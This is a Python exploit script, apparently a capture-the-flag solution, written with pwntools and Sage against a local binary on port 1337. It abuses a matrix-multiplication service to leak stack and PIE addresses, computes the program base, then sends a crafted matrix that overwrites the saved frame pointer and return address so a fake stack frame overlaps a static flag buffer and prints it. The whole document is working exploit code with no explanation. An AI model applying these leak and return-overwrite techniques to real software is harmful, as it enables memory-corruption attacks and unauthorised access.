#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from sage.all import *
from pwn import *

context.terminal = "pwn-client.sh"
context.log_level = "debug"

exe = context.binary = ELF(args.EXE or "../src/main")
args.GDB = False
args.REMOTE = True


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, api=True, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return connect("localhost", 1337)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = """
start
b matvecmul
continue
""".format(
    **locals()
)


def close(conn):
    conn.close()
    if hasattr(conn, "gdb"):
        conn.gdb.quit()


def receive_matrix(conn, nrows, ncols):
    conn.recvline()
    cols = []
    for _ in range(ncols):
        row = []
        for _ in range(nrows):
            row.append(int(conn.recvline()))
        cols.append(row)
    return matrix(Integers(256), cols).transpose()


def send_matrix(conn, A):
    for col in A.columns():
        for x in col:
            conn.sendline(str(x).encode())


def print_transform(conn):
    conn.sendlineafter(b"> ", "1")
    return receive_matrix(conn, 16, 16)


def forward_pass(conn, A):
    conn.sendlineafter(b"> ", "2")
    send_matrix(conn, A)


def backward_pass(conn):
    conn.sendlineafter(b"> ", "3")
    return receive_matrix(conn, 1, 16)


def quit(conn):
    conn.sendlineafter(b"> ", "4")


def solve():
    conn = start()
    B = print_transform(conn)
    assert B.is_invertible()

    A = vector(backward_pass(conn))
    C = B.inverse() * A
    stack_leak = u64(bytes(C[:8])) >> 8
    pie_leak = u64(bytes(C[8:])) >> 8
    print("stack leak:", hex(stack_leak))
    print("pie leak:", hex(pie_leak))

    exe.address = pie_leak - 0x1DEE
    print("exe base", hex(exe.address))
    new_return = exe.address + 0x1D10  # function BLAST, just before user input

    # create a new stack frame where B overlaps with the flag
    flag_static = exe.symbols.flag["2"]
    print("flag static", hex(flag_static))
    fake_B = flag_static

    new_rbp = fake_B + 0x110
    print("new rbp:", hex(new_rbp))
    new_rbp_return = fit(
        {
            1: p64(new_rbp),
            9: p64(new_return)[:-1],
        },
        length=16,
    )
    forward_pass(conn, matrix(B.inverse() * vector(new_rbp_return)))

    B = print_transform(conn)
    print(bytes(B.transpose().list()))
    conn.close()


if __name__ == "__main__":
    solve()
